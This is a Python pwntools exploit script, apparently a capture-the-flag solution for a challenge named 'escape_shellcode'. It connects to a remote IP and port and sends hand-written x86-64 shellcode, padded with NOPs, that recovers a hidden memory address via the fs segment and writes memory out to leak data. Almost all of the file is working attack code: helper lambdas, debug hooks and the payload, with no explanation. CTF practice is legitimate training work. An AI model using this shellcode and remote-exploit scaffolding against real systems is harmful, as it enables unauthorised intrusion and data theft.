# -*- encoding: utf-8 -*-
from pwn import * 
binary = './escape_shellcode'
context.update( os = 'linux', arch = 'amd64')
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
DEBUG = 0
if DEBUG:
    p = process(binary)
else:
    host = '39.107.124.203'
    port = '44853'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def attack():

    offset = 0x000000000004120 -  0x0000000000011A0
    shellcode = asm(
        '''
        mov rsp , fs:[0x300]
        mov rsi , [rsp + 0x10]
        add rsi , 0x2f80
        mov rax , 1
        mov rdi , 1
        mov rdx , 0x99
        syscall
        '''
    )


    # sleep(1)
    # raw_input()
    # dbg()
    se(shellcode.ljust(0x100 , '\x90'))
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   escape_shellcode.py
@Time    :   2022/07/09 10:52:17
@Author  :   Niyah 
'''